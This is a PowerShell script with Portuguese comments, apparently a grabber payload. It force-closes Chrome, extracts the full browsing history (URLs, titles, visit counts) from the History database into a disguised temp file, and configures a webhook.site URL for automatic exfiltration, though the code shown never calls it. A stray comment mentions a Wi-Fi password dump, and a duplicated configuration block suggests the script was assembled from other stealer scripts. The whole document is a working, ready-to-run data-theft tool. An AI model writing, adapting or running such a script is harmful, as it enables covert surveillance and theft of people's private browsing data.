# === CONFIGURAÇÕES (edite aqui antes de executar) ===

# Deixe vazio ('') se não quiser enviar automaticamente para webhook
$WebhookUrl = 'https://webhook.site/0e19741a-559b-4878-9931-512f553f8733'

# Pasta de exportação (padrão: %TEMP%\p)
$ExportDirDefault = Join-Path $env:TEMP 'p'
# Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
$OutputFileDefault = Join-Path $env:TEMP 'ChromeHistory.txt'
# ====================================================




# Pasta de exportação (padrão: %TEMP%\p)
$ExportDirDefault = Join-Path $env:TEMP 'p'

# Nome do arquivo de saída (padrão: %TEMP%\ChromeHistory.txt)
$OutputFileDefault = Join-Path $env:TEMP 'ChromeHistory.txt'

Function Get-ChromeDump {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$OutputFile = $OutputFileDefault,

        [Parameter(Mandatory=$false)]
        [string]$ExportDir = $ExportDirDefault
    )

    # Criar pasta de exportação
    if (-not (Test-Path $ExportDir)) {
        New-Item -Path $ExportDir -ItemType Directory -Force | Out-Null
    }

    # Fechar Chrome se estiver em execução
    if (Get-Process -Name chrome -ErrorAction SilentlyContinue) {
        Write-Warning "[!] Stopping Chrome..."
        Stop-Process -Name chrome -Force
    }

    # Localizar diretório de dados do Chrome
    $chromepath = if ([environment]::OSVersion.Version.Major -ge 6) {
        Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default'
    }
    else {
        Join-Path $env:HOMEDRIVE "${env:HOMEPATH}\Local Settings\Application Data\Google\Chrome\User Data\Default"
    }

    if (-not (Test-Path $chromepath)) {
        Throw "Chrome user data directory does not exist"
    }

    # Banco de histórico
    $historyDb = Join-Path $chromepath 'History'

    if (-not (Test-Path $historyDb)) {
        Throw "Chrome History database does not exist"
    }

    # Localizar assembly SQLite
    $assemblyPath = Join-Path $env:LOCALAPPDATA 'System.Data.SQLite.dll'

    if (-not (Test-Path $assemblyPath)) {
        Write-Warning "[!] SQLite assembly not found at: $assemblyPath"
        return
    }

    Add-Type -Path $assemblyPath

    # Ler histórico
    Write-Verbose "Parsing browsing history..."

    $history = @()

    $conn = New-Object System.Data.SQLite.SQLiteConnection(
        "Data Source=$historyDb;Version=3;"
    )

    try {
        $conn.Open()

        $cmd = $conn.CreateCommand()
        $cmd.CommandText = @"
SELECT url, title, visit_count
FROM urls
ORDER BY last_visit_time DESC
"@

        $reader = $cmd.ExecuteReader()

        while ($reader.Read()) {
            $history += [PSCustomObject]@{
                URL = $reader.GetString(
                    $reader.GetOrdinal('url')
                )

                Title = if (
                    $reader.IsDBNull(
                        $reader.GetOrdinal('title')
                    )
                ) {
                    '(null)'
                }
                else {
                    $reader.GetString(
                        $reader.GetOrdinal('title')
                    )
                }

                VisitCount = $reader.GetInt32(
                    $reader.GetOrdinal('visit_count')
                )
            }
        }

        $reader.Close()
    }
    finally {
        $conn.Close()
        $conn.Dispose()
    }

    # Garantir que o diretório do arquivo de saída exista
    $OutputParent = Split-Path $OutputFile -Parent

    if ($OutputParent -and -not (Test-Path $OutputParent)) {
        New-Item -Path $OutputParent -ItemType Directory -Force | Out-Null
    }

    # Gravar resultado
    @"
[*] HISTORY
"@ | Out-File -FilePath $OutputFile -Encoding UTF8

    if ($history) {
        $history |
            Format-Table -AutoSize |
            Out-File -FilePath $OutputFile -Append -Encoding UTF8
    }
    else {
        "  (none found)" |
            Out-File -FilePath $OutputFile -Append -Encoding UTF8
    }

    Write-Host "[+] History dump saved to: $OutputFile"

    # Retornar o caminho do arquivo para a variável $out
    return $OutputFile
}

$out = Get-ChromeDump `
    -OutputFile $OutputFileDefault `
    -ExportDir $ExportDirDefault

$out